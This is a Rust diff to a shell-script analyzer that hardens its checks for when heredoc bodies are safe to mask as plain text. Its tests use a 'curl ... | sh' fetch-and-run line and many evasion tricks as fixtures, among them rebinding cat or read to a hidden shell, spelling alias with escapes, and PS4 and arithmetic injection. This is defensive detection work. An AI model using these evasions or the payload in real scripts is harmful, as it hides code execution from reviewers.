@@ -9,12 +9,15 @@
 //! shell (a pipe into anything but a plain text filter, a file redirection, a
 //! command substitution around the printer, eval/source/exec/coproc/trap, a
 //! shell or privilege wrapper (also `$SHELL` / `$BASH`), a command whose name
-//! is an expansion, an alias, `BASH_CMDS` / `BASH_ALIASES` or a redefined
-//! printer, any `PATH` word other than a plain `$PATH` expansion,
-//! allexport), nothing is masked
+//! is or holds an expansion, an alias, `BASH_CMDS` / `BASH_ALIASES`, zsh's
+//! command tables or `path` / `fpath`, a redefined printer, filter or
+//! `read`, a function whose name the word scan cannot read (`c\at() {`),
+//! any `PATH` word other than a plain `$PATH` expansion, allexport; words
+//! are also checked with backslashes and quotes removed), nothing is masked
 //! and every heredoc line is read as before. A heredoc read or captured into
 //! a variable is masked only when every use of the variable is a plain
-//! expansion in an `echo` / `printf` command and nothing can reach its value
+//! expansion, outside any other `${...}` / `$[...]`, in an `echo` command or
+//! a `printf` with a literal string-only format, and nothing can reach its value
 //! without naming it (`${!name}`, a nameref, `$_`, a variable listing),
 //! and the variable is not one the shell expands or evaluates by itself
 //! (`PS4`, integer specials such as `OPTIND`; see [`SHELL_SPECIAL_NAMES`]).
@@ -85,6 +88,8 @@ const EVALUATING_WORDS: &[&str] = &[
     "doas",
     "runuser",
     "pkexec",
+    // zsh loads a function (which may be named `cat`) from `fpath`.
+    "autoload",
     // `$SHELL` / `$BASH` name the running shell.
     "SHELL",
     "BASH",
@@ -177,6 +182,17 @@ const MAX_VARIABLE_MENTIONS: usize = 64;
 
 /// Prefixes allowed before a printer on its header line.
 const HEADER_PREFIXES: &[&str] = &["{", "then", "do", "else"];
+
+/// Commands a candidate header or a variable print runs besides the
+/// [`PRINTERS`] and [`TEXT_FILTERS`]: a function with one of these names
+/// receives the heredoc (or the assignment holding it) instead of the
+/// builtin.
+const HEADER_COMMANDS: &[&str] = &["read", "local", "readonly", "true"];
+
+/// Characters that make a function name something the word scan cannot
+/// compare (`c\at`, `'read'`, `re${E}ad`, `{cat,x}`): such a definition
+/// disables masking.
+const UNRESOLVED_NAME: &[char] = &['\\', '\'', '"', '$', '`', '{', '}', '[', ']', '*', '?', '~'];
 
 enum Shape {
     /// `cat <<EOF`: output goes to stdout/stderr.
@@ -353,15 +369,24 @@ fn mask(text: &str, spans: &[PosixHeredocSpan]) -> Option<(String, BTreeSet<usiz
         })
         .map(|span| span.body.clone())
         .collect();
-    let quoted = if names.is_empty() {
-        Vec::new()
+    let (quoted, expansions) = if names.is_empty() {
+        (Vec::new(), Vec::new())
     } else {
-        quoted_regions(&uses, &other_bodies)?
+        (
+            quoted_regions(&uses, &other_bodies)?,
+            expansion_ranges(&uses),
+        )
     };
-    if !names
-        .iter()
-        .all(|name| variable_only_printed(&uses, name, &substitutions, &other_bodies, &quoted))
-    {
+    if !names.iter().all(|name| {
+        variable_only_printed(
+            &uses,
+            name,
+            &substitutions,
+            &other_bodies,
+            &quoted,
+            &expansions,
+        )
+    }) {
         return None;
     }
     let inert = candidates
@@ -563,13 +588,23 @@ fn rest_is_inert(
     captures: &BTreeMap<usize, Range<usize>>,
     names: &[String],
 ) -> bool {
-    // Nothing evaluates text, starts a shell or rebinds a command name.
-    if words(rest).any(|word| EVALUATING_WORDS.contains(&word) || word == "allexport")
-        || rest
-            .split(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
-            .any(|identifier| REBINDING_NAMES.contains(&identifier))
-        || names_path(rest)
-        || expansion_command_word(rest)
+    // Nothing evaluates text, starts a shell or rebinds a command name, also
+    // when the word is spelled with backslashes or quotes inside it
+    // (`ha\sh`, `al''ias`): the shell removes those before it looks the
+    // word up.
+    let spelled: Option<String> = rest.contains(['\\', '\'', '"']).then(|| {
+        rest.chars()
+            .filter(|c| !matches!(c, '\\' | '\'' | '"'))
+            .collect()
+    });
+    if std::iter::once(rest).chain(spelled.as_deref()).any(|view| {
+        words(view).any(|word| EVALUATING_WORDS.contains(&word) || word == "allexport")
+            || view
+                .split(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
+                .any(|identifier| REBINDING_NAMES.contains(&identifier))
+            || names_path(view)
+            || zsh_rebinding(view)
+    }) || expansion_command_word(rest)
         || dot_command(rest)
         || line_has_flag(rest, "set", 'a')
         || line_has_flag(rest, "export", 'f')
@@ -577,9 +612,11 @@ fn rest_is_inert(
         return false;
     }
     let functions = function_names(rest);
-    if functions
-        .iter()
-        .any(|name| PRINTERS.contains(&name.as_str()) || TEXT_FILTERS.contains(&name.as_str()))
+    if functions.iter().any(|name| {
+        PRINTERS.contains(&name.as_str())
+            || TEXT_FILTERS.contains(&name.as_str())
+            || HEADER_COMMANDS.contains(&name.as_str())
+    }) || defines_unresolved_function(rest)
     {
         return false;
     }
@@ -623,6 +660,47 @@ fn rest_is_inert(
         .all(|open| substitutions.iter().any(|range| range.start == *open))
 }
 
+/// zsh rebinds a command name through its parameter tables
+/// (`functions[cat]=...`, `commands[cat]=...`, `aliases[cat]=...`) and finds
+/// commands and autoloaded functions through the arrays tied to `PATH` and
+/// `FPATH` (`path=(./bin $path)`). An assignment to one of these, or a
+/// `read` / `vared` / `set -A` / `for` naming `path` or `fpath`, disables
+/// masking.
+fn zsh_rebinding(text: &str) -> bool {
+    static ASSIGNMENT: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
+        regex::Regex::new(concat!(
+            r"(?:^|[^A-Za-z0-9_$.{/-])",
+            r"(?:functions|functions_source|dis_functions|commands|aliases|dis_aliases|galiases|dis_galiases|saliases|dis_saliases|builtins|path|fpath)",
+            r"(?:\[[^\]\n]*\])?\+?=",
+        ))
+        .expect("static regex")
+    });
+    static NAMED: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
+        regex::Regex::new(
+            r"(?m)\b(?:read|vared|set|for|select|getopts)\b[^\n;&|]*[\s(](?:path|fpath)\b",
+        )
+        .expect("static regex")
+    });
+    ASSIGNMENT.is_match(text) || NAMED.is_match(text)
+}
+
+/// A function definition whose name holds a character in
+/// [`UNRESOLVED_NAME`]: ksh and zsh define `c\at() { ...; }` and
+/// `'cat'() { ...; }` as `cat`, and zsh expands `re${E}ad() { ...; }` to
+/// `read`, so the name cannot be compared with the header commands.
+fn defines_unresolved_function(text: &str) -> bool {
+    static DEFINITION: once_cell::sync::Lazy<regex::Regex> = once_cell::sync::Lazy::new(|| {
+        regex::Regex::new(
+            r"(?m)(?:^|[;&|{(\s])(?:function\s+)?([^\s;&|()<>]+)\s*\(\s*\)|(?:^|[;&|{(\s])function\s+([^\s;&|()<>]+)",
+        )
+        .expect("static regex")
+    });
+    DEFINITION
+        .captures_iter(text)
+        .filter_map(|captures| captures.get(1).or_else(|| captures.get(2)))
+        .any(|name| name.as_str().contains(UNRESOLVED_NAME))
+}
+
 /// The word `PATH` anywhere except as a plain `$PATH` / `${PATH}`
 /// expansion. Besides `PATH=` / `PATH+=` (`export PATH=...`, `PATH=x cmd`),
 /// `for PATH in`, `read PATH`, `getopts ... PATH` and the like also set it,
@@ -642,9 +720,10 @@ fn names_path(text: &str) -> bool {
 }
 
 /// A command word (after assignments and plain wrappers such as `env`,
-/// `nohup` or `command`) that is an expansion (`$X`, `"${X}"`, `"$@"`,
-/// `$(...)`): the file runs a command it computes, which could be a shell
-/// reading text back. Defence in depth next to the per-variable check, so
+/// `nohup` or `command`) that is or holds an expansion (`$X`, `"${X}"`,
+/// `"$@"`, `$(...)`, `al${E}ias`, `$'\x61lias'`): the file runs a command it
+/// computes, which could be a shell reading text back or a builtin that
+/// rebinds `cat`. Defence in depth next to the per-variable check, so
 /// a parse slip there cannot mask a body this file executes. Quoted text
 /// that only looks like a command position fails toward the signal.
 fn expansion_command_word(text: &str) -> bool {
@@ -661,7 +740,9 @@ fn expansion_command_word(text: &str) -> bool {
             // assignments.
             r"(?:(?:env|nohup|nice|command|builtin|setsid|xargs|timeout|stdbuf|time)",
             r#"(?:[ \t]+(?:-[^ \t;&|]*|[0-9][^ \t;&|]*|[A-Za-z_][A-Za-z0-9_]*=(?:"[^"\n]*"|'[^'\n]*'|[^ \t;&|()"'`\\])*))*[ \t]+)*"#,
-            r#"["']?\$[A-Za-z_{(@*0-9!#?-]"#,
+            // The command word holds an expansion anywhere (`$X`, `"$X"`,
+            // `al${E}ias`, `$'\x61lias'`), except as an assignment value.
+            r#"[^ \t\n;&|()<>=]*\$[A-Za-z_{(@*0-9!#?'"-]"#,
         ))
         .expect("static regex")
     });
@@ -1004,16 +1085,162 @@ fn redirects_only_reorder(text: &str) -> bool {
     true
 }
 
+/// Every `${...}` and `$[...]` in `text`, from the `$` through the closer.
+/// Brackets nest. A quote, backslash or backtick inside one, or a closer
+/// that does not match, leaves the open ones running to the end of `text`
+/// (fail closed: the shell's own matching may differ).
+fn expansion_ranges(text: &str) -> Vec<Range<usize>> {
+    let bytes = text.as_bytes();
+    let mut ranges = Vec::new();
+    // (start, closer, is an expansion)
+    let mut open: Vec<(usize, u8, bool)> = Vec::new();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        let byte = bytes[index];
+        if byte == b'$' && matches!(bytes.get(index + 1), Some(b'{' | b'[')) {
+            let closer = if bytes[index + 1] == b'{' { b'}' } else { b']' };
+            open.push((index, closer, true));
+            index += 2;
+            continue;
+        }
+        if !open.is_empty() {
+            match byte {
+                b'{' => open.push((index, b'}', false)),
+                b'[' => open.push((index, b']', false)),
+                b'}' | b']' if open.last().is_some_and(|top| top.1 == byte) => {
+                    let (start, _, expansion) = open.pop().expect("checked non-empty");
+                    if expansion {
+                        ranges.push(start..index + 1);
+                    }
+                }
+                b'}' | b']' | b'\'' | b'"' | b'\\' | b'`' => break,
+                _ => {}
+            }
+        }
+        index += 1;
+    }
+    ranges.extend(
+        open.into_iter()
+            .filter(|(_, _, expansion)| *expansion)
+            .map(|(start, ..)| start..bytes.len()),
+    );
+    ranges
+}
+
+/// A `printf` command (`masked` with its quoted bytes replaced, `raw` the
+/// same bytes as written) that only prints: no `-v` (also quoted, joined
+/// to the name, after a redirection, or made by brace, tilde or glob
+/// expansion of the format word: `{-v,X}`, `~-`, `[-]v`, `@(-v)`), and a
+/// literal format whose conversions only take strings (`%s`, `%b`, `%q`,
+/// `%c`): ksh and zsh evaluate the argument of a numeric conversion or a
+/// `*` width as arithmetic.
+fn printf_only_prints(masked: &str, raw: &str) -> bool {
+    if raw.split_whitespace().any(|word| word == "-v") {
+        return false;
+    }
+    // Words by the masked text, where quoted whitespace is not a separator.
+    let mut ranges = Vec::new();
+    let mut word_start = None;
+    for (index, byte) in masked.bytes().enumerate() {
+        match (byte.is_ascii_whitespace(), word_start) {
+            (true, Some(start)) => {
+                ranges.push(start..index);
+                word_start = None;
+            }
+            (false, None) => word_start = Some(index),
+            _ => {}
+        }
+    }
+    if let Some(start) = word_start {
+        ranges.push(start..masked.len());
+    }
+    let mut words = ranges
+        .into_iter()
+        .map(|range| (&masked[range.clone()], &raw[range]))
+        .skip_while(|(word, _)| HEADER_PREFIXES.contains(word));
+    if words.next().map(|(word, _)| word) != Some("printf") {
+        return false;
+    }
+    let mut end_of_options = false;
+    loop {
+        let Some((unquoted, word)) = words.next() else {
+            return false;
+        };
+        // A redirection before the format (`>&2`, `2>/dev/null`, or `>`
+        // followed by its target) does not end the options.
+        if unquoted.contains(['>', '<']) {
+            if unquoted.ends_with(['>', '<', '&']) {
+                words.next();
+            }
+            continue;
+        }
+        if unquoted.contains(['{', '[', '*', '?', '~', '(', '`', '$']) {
+            return false;
+        }
+        let bare: String = word
+            .chars()
+            .filter(|c| !matches!(c, '\'' | '"' | '\\'))
+            .collect();
+        if bare.starts_with(['$', '`', '~']) || bare.contains(['$', '`']) {
+            return false;
+        }
+        if bare == "--" && !end_of_options {
+            end_of_options = true;
+            continue;
+        }
+        if bare.starts_with('-') && !end_of_options {
+            return false;
+        }
+        let format: String = word.chars().filter(|c| !matches!(c, '\'' | '"')).collect();
+        return string_conversions_only(&format);
+    }
+}
+
+/// Every `%` conversion in a printf `format` is `%%` or takes a string
+/// (`%s`, `%b`, `%q`, `%c`), with flags and a literal width / precision
+/// only.
+fn string_conversions_only(format: &str) -> bool {
+    let bytes = format.as_bytes();
+    let mut index = 0usize;
+    while index < bytes.len() {
+        if bytes[index] != b'%' {
+            index += 1;
+            continue;
+        }
+        index += 1;
+        if bytes.get(index) == Some(&b'%') {
+            index += 1;
+            continue;
+        }
+        while bytes
+            .get(index)
+            .is_some_and(|byte| matches!(byte, b'-' | b'+' | b' ' | b'#' | b'0'..=b'9' | b'.'))
+        {
+            index += 1;
+        }
+        if !bytes
+            .get(index)
+            .is_some_and(|byte| matches!(byte, b's' | b'b' | b'q' | b'c'))
+        {
+            return false;
+        }
+        index += 1;
+    }
+    true
+}
+
 /// Every mention of `name` is a plain `$name` / `${name}` expansion in an
-/// `echo` or `printf` (without `-v`) command, outside any substitution and
-/// any other heredoc's body. `quoted` holds the sorted quoted regions of
-/// `text` (see [`quoted_regions`]).
+/// `echo` or `printf` command that only prints (see [`printf_only_prints`]),
+/// outside any substitution, any other heredoc's body and any other
+/// `${...}` / `$[...]` (`expansions`, see [`expansion_ranges`]). `quoted`
+/// holds the sorted quoted regions of `text` (see [`quoted_regions`]).
 fn variable_only_printed(
     text: &str,
     name: &str,
     substitutions: &[Range<usize>],
     other_bodies: &[Range<usize>],
     quoted: &[Range<usize>],
+    expansions: &[Range<usize>],
 ) -> bool {
     let bytes = text.as_bytes();
     let ident = |byte: u8| byte.is_ascii_alphanumeric() || byte == b'_';
@@ -1039,6 +1266,15 @@ fn variable_only_printed(
             .iter()
             .chain(other_bodies)
             .any(|range| range.contains(&at))
+        {
+            return false;
+        }
+        // Inside another `${...}` or `$[...]` the value may be evaluated as
+        // arithmetic (`${a[$X]}`, `${HOME:$X}`, `$[$X]`), which runs
+        // command substitutions in its array subscripts.
+        if expansions
+            .iter()
+            .any(|range| range.contains(&at) && range.start + 2 != at)
         {
             return false;
         }
@@ -1098,25 +1334,7 @@ fn variable_only_printed(
         let raw = &text[line_start + command_start..line_start + command_end];
         let printer = match after_prefixes(&line[command_start..command_end]).next() {
             Some("echo") => true,
-            // `printf -v NAME` assigns instead of printing; options come
-            // before the format, also quoted (`'-v'`), joined (`-vNAME`),
-            // from an expansion, or made by brace, tilde or glob expansion
-            // of the unquoted format word (`{-v,X}`, `~-`, `[-]v`, `@(-v)`).
-            Some("printf") => {
-                let unquoted = after_prefixes(&line[command_start..command_end]).nth(1);
-                let format = after_prefixes(raw).nth(1).map(|word| {
-                    word.chars()
-                        .filter(|c| !matches!(c, '\'' | '"' | '\\'))
-                        .collect::<String>()
-                });
-                !raw.split_whitespace().any(|word| word == "-v")
-                    && unquoted
-                        .is_some_and(|word| !word.contains(['{', '[', '*', '?', '~', '(', '`']))
-                    && format.is_some_and(|format| {
-                        !(format.starts_with('-') && format != "--")
-                            && !format.starts_with(['$', '`', '~'])
-                    })
-            }
+            Some("printf") => printf_only_prints(&line[command_start..command_end], raw),
             _ => false,
         };
         if !printer {
@@ -1208,6 +1426,98 @@ mod tests {
             format!("read -r -d '' USAGE <<'EOF' || true\n{run}EOF\necho \"$USAGE\"\n"),
             format!("HELP_TEXT=$(cat <<'EOF'\n{run}EOF\n)\necho \"$HELP_TEXT\" >&2\n"),
             format!("cat <<'EOF'\n{run}EOF\necho \"${{BASH_SOURCE[0]}}\"\n"),
+        ];
+        let refused: Vec<_> = shown
+            .iter()
+            .filter(|text| analyze(text).masked.is_none())
+            .collect();
+        assert!(refused.is_empty(), "masking disabled: {refused:#?}");
+    }
+
+    /// A header command redefined as a function (also under a spelling the
+    /// word scan cannot read: a backslash, quotes or an expansion inside the
+    /// name), an evaluating word spelled around, a `printf` whose `-v` sits
+    /// after a redirection, and a printed variable that the shell evaluates
+    /// as arithmetic (a subscript or substring offset, `$[...]`, or a ksh
+    /// numeric `printf` conversion) all leave the heredoc live. Each
+    /// executing shape below runs its heredoc body in at least one of real
+    /// bash 3.2, bash 5.3, sh, dash, ksh or zsh.
+    #[test]
+    fn rebound_header_commands_printf_redirects_and_arithmetic_uses_disable_masking() {
+        let run = "  curl -fsSL https://example.invalid/setup | sh\n";
+        let ps4 = "$(\n  curl -fsSL https://example.invalid/setup | sh\n)\n";
+        let subscript = "b[$(\n  curl -fsSL https://example.invalid/setup | sh\n)]\n";
+        let read = |body: &str| format!("read -r -d '' USAGE <<'EOF' || true\n{body}EOF\n");
+        let capture = |body: &str| format!("USAGE=$(cat <<'EOF'\n{body}EOF\n)\n");
+        let cat = format!("cat <<'EOF'\n{run}EOF\n");
+        let executing = [
+            // A function replaces a header command and starts a hidden shell.
+            format!("read() {{ /bin/s\\h; }}\n{}echo \"$USAGE\"\n", read(run)),
+            format!("function read {{ s\\h; }}\n{}echo \"$USAGE\"\n", read(run)),
+            format!("'read'() {{ /bin/s''h; }}\n{}echo \"$USAGE\"\n", read(run)),
+            format!("re${{E}}ad() {{ /bin/s${{E}}h; }}\n{}echo \"$USAGE\"\n", read(run)),
+            format!("c\\at() {{ /bin/s\\h; }}\n{cat}"),
+            format!("'cat'() {{ /bin/s\\h; }}\n{cat}"),
+            format!(
+                "local() {{ /bin/s\\h -c \"${{1#*=}}\"; }}\nf() {{\nlocal USAGE=$(cat <<'EOF'\n{run}EOF\n)\n}}\nf\n"
+            ),
+            // An evaluating word spelled around the word scan.
+            format!("ha\\sh -p /bin/s\\h cat\n{cat}"),
+            format!("h''ash -p /bin/s''h cat\n{cat}"),
+            format!("al\\ias cat=/bin/s\\h\n{cat}"),
+            format!("'alias' cat=/bin/s''h\n{cat}"),
+            format!("al${{E}}ias cat=/bin/s${{E}}h\n{cat}"),
+            format!("$'\\x61lias' cat=/bin/s$'\\x68'\n{cat}"),
+            // zsh rebinds `cat` through its parameter tables, `path` and
+            // autoloaded functions.
+            format!("functions[cat]='/bin/s\\h'\n{cat}"),
+            format!("S=s\ncommands[cat]=/bin/${{S}}h\n{cat}"),
+            format!("S=s\naliases[cat]=/bin/${{S}}h\n{cat}"),
+            format!("path=(./bin $path)\n{cat}"),
+            format!("fpath=(./fn $fpath)\nautoload -Uz cat\n{cat}"),
+            // `printf -v` after a redirection still assigns.
+            format!("{}printf >&2 -vPS4 '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
+            format!("{}printf >&2 '-v' PS4 '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
+            format!("{}printf 2>/dev/null -vPS4 '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
+            format!("{}printf >&2 {{-v,PS4}} '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
+            format!("{}printf > /dev/null -vPS4 '%s' \"$USAGE\"\nset -x\necho hi\n", read(ps4)),
+            format!("{}printf >&2 -- -vX\nprintf >&2 -vPS4 %s \"$USAGE\"\nset -x\n", read(ps4)),
+            // The printed variable is evaluated as arithmetic.
+            format!("{}echo \"${{a[$USAGE]}}\"\n", read(subscript)),
+            format!("{}echo \"${{a[$USAGE]}}\"\n", capture(subscript)),
+            format!("{}printf '%s\\n' \"${{a[$USAGE]}}\"\n", read(subscript)),
+            format!("{}echo \"${{HOME:$USAGE}}\"\n", read(subscript)),
+            format!("{}echo \"${{HOME:0:$USAGE}}\"\n", read(subscript)),
+            format!("{}echo $[$USAGE]\n", read(subscript)),
+            format!("{}echo ${{a[\n$USAGE]}}\n", read(subscript)),
+            format!("{}printf '%d\\n' \"$USAGE\"\n", read(subscript)),
+            format!("{}printf '%d\\n' \"$USAGE\"\n", capture(subscript)),
+            format!("{}printf '%i %x' \"$USAGE\" 1\n", read(subscript)),
+            format!("{}printf '%*s|\\n' \"$USAGE\" x\n", read(subscript)),
+            format!("{}printf '%s %d\\n' x \"$USAGE\"\n", read(subscript)),
+            format!("{}printf -- '%d\\n' \"$USAGE\"\n", read(subscript)),
+            format!("F='%d'\n{}printf \"$F\" \"$USAGE\"\n", read(subscript)),
+            format!("F='%d'\n{}printf \"%s$F\" x \"$USAGE\"\n", read(subscript)),
+        ];
+        let masked: Vec<_> = executing
+            .iter()
+            .filter(|text| {
+                let view = analyze(text);
+                view.masked.is_some() || view.live_bodies.is_empty()
+            })
+            .collect();
+        assert!(masked.is_empty(), "heredoc masked: {masked:#?}");
+        let shown = [
+            format!("{}echo \"$USAGE\"\n", read(run)),
+            format!("{}echo \"${{USAGE}}\" >&2\n", read(run)),
+            format!("{}printf >&2 '%s\\n' \"$USAGE\"\n", read(run)),
+            format!(
+                "{}printf 2>/dev/null -- '%-10s: %5.2s %b %q %c %%\\n' \"$USAGE\"\n",
+                read(run)
+            ),
+            format!("{}echo \"${{HOME}}: ${{1:-}} $USAGE\"\n", capture(run)),
+            format!("usage() {{\n  cat <<'EOF'\n{run}EOF\n}}\nusage\n"),
+            format!("{cat}echo 'path: see the docs'\n"),
         ];
         let refused: Vec<_> = shown
             .iter()
